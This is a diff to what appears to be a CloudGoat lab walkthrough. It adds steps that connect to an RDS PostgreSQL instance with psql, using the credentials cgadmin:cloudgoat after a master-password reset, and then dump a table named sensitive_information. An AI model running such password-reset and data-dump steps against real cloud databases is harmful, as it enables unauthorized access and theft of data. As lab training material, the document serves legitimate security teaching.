@@ -1967,10 +1967,15 @@ aws rds modify-db-instance --db-instance-identifier <DbName> --master-user-passw
   <img src="/images/cloud/modify_instance.png">
 </p>
 
-* Log into the **database** using the modified password.
+* Using **DB name,Username,Password and RDS Instance** try to connect via psql to retrive _sensitive information_.
+
+```bash
+psql postgresql://cgadmin:cloudgoat@<rds-instance>:5432/postgres
+\l
+\c securedb
+select * from sensitive_information;
+```
 
 <p align="center">
-  <img src="/images/cloud/modify_instance.png">
+  <img src="/images/cloud/flag_calrissian.png">
 </p>
-
-* 
